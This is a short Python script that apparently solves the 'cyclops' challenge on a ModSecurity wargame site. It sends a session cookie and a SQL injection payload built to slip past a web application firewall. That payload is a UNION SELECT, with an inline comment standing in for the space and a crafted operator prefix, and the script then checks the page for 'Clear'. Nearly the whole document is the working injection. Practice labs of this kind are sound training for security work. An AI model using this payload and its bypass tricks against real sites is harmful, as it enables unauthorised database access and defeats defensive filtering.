import requests
import os

URL_ID=os.environ['URL_ID']
PHPSESSID=os.environ['PHPSESSID']

url = f"https://modsec.rubiya.kr/chall/cyclops_{URL_ID}.php"
cookie = {'PHPSESSID': PHPSESSID}


res = requests.get(url, params={'id': '\'<@=1 union/**/select \'first\',\'second\' #'},cookies=cookie)
if res.text.find("Clear") >= 0:
    print("Clear!")
else:
    print("Failed")